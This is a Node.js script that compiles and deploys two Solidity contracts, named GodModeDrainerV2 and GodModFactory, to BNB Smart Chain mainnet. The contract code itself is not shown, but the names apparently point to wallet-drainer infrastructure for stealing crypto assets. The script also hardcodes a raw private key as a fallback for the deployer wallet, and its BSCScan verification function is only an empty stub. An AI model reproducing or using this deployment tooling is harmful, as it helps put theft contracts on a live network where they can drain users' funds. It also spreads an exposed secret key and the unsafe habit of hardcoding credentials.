require('dotenv').config();
const { ethers } = require("ethers");
const solc = require('solc');
const fs = require('fs');
const path = require('path');

async function compileContract(sourcePath, contractName) {
    const source = fs.readFileSync(sourcePath, 'utf8');

    const input = {
        language: 'Solidity',
        sources: {
            [contractName + '.sol']: {
                content: source
            }
        },
        settings: {
            outputSelection: {
                '*': {
                    '*': ['*']
                }
            },
            optimizer: {
                enabled: true,
                runs: 200
            }
        }
    };

    const output = JSON.parse(solc.compile(JSON.stringify(input)));

    if (output.errors) {
        console.error('Compilation errors:', output.errors);
        throw new Error('Contract compilation failed');
    }

    const contract = output.contracts[contractName + '.sol'][contractName];
    return {
        abi: contract.abi,
        bytecode: contract.evm.bytecode.object
    };
}

async function deployToBSC() {
    console.log('🚀 Starting deployment to BSC...');

    // BSC configuration
    const rpcUrl = 'https://bsc-dataseed.binance.org/';
    const privateKey = process.env.BSC_PRIVATE_KEY || 'd31643bdec7155297a9beaad96a0c1c0026492c13fd0e6407e58c410c287abd5';

    if (!privateKey) {
        throw new Error('BSC_PRIVATE_KEY not found in environment');
    }

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);

    console.log('📱 Deployer address:', wallet.address);

    // Check balance
    const balance = await provider.getBalance(wallet.address);
    console.log('💰 Balance:', ethers.formatEther(balance), 'BNB');

    if (balance < ethers.parseEther('0.01')) {
        throw new Error('Insufficient BNB balance for deployment');
    }

    // Compile contracts
    console.log('🔨 Compiling GodModeDrainerV2...');
    const drainerArtifact = await compileContract(
        path.join(__dirname, '../contracts/src/GodModeDrainerV2.sol'),
        'GodModeDrainerV2'
    );

    console.log('🔨 Compiling GodModFactory...');
    const factoryArtifact = await compileContract(
        path.join(__dirname, '../contracts/src/GodModFactory.sol'),
        'GodModFactory'
    );

    // Deploy GodModeDrainerV2
    console.log('📦 Deploying GodModeDrainerV2...');
    const DrainerFactory = new ethers.ContractFactory(
        drainerArtifact.abi,
        drainerArtifact.bytecode,
        wallet
    );

    const drainer = await DrainerFactory.deploy();
    await drainer.waitForDeployment();

    const drainerAddress = await drainer.getAddress();
    console.log('✅ GodModeDrainerV2 deployed at:', drainerAddress);

    // Deploy GodModFactory
    console.log('📦 Deploying GodModFactory...');
    const FactoryFactory = new ethers.ContractFactory(
        factoryArtifact.abi,
        factoryArtifact.bytecode,
        wallet
    );

    const factory = await FactoryFactory.deploy(drainerAddress);
    await factory.waitForDeployment();

    const factoryAddress = await factory.getAddress();
    console.log('✅ GodModFactory deployed at:', factoryAddress);

    // Save deployment info
    const deploymentInfo = {
        network: 'bsc',
        drainer: drainerAddress,
        factory: factoryAddress,
        deployer: wallet.address,
        timestamp: new Date().toISOString()
    };

    fs.writeFileSync(
        path.join(__dirname, '../contracts/deployment.json'),
        JSON.stringify(deploymentInfo, null, 2)
    );

    console.log('💾 Deployment info saved to contracts/deployment.json');

    // Verify contracts on BSCScan
    console.log('🔍 Verifying contracts on BSCScan...');
    try {
        await verifyContract(drainerAddress, [], drainerArtifact.bytecode);
        await verifyContract(factoryAddress, [drainerAddress], factoryArtifact.bytecode);
    } catch (error) {
        console.log('⚠️  Verification failed, but contracts are deployed');
    }

    return deploymentInfo;
}

async function verifyContract(address, constructorArgs, bytecode) {
    // BSCScan verification would go here
    console.log(`Verifying ${address}...`);
    // Implementation would use BSCScan API
}

async function main() {
    try {
        const deployment = await deployToBSC();
        console.log('\n🎉 Deployment successful!');
        console.log('📋 Contract Addresses:');
        console.log('   GodModeDrainerV2:', deployment.drainer);
        console.log('   GodModFactory:', deployment.factory);
        console.log('\n🔗 BSCScan Links:');
        console.log(`   Drainer: https://bscscan.com/address/${deployment.drainer}`);
        console.log(`   Factory: https://bscscan.com/address/${deployment.factory}`);
    } catch (error) {
        console.error('❌ Deployment failed:', error.message);
        process.exit(1);
    }
}

if (require.main === module) {
    main();
}

module.exports = { deployToBSC, compileContract };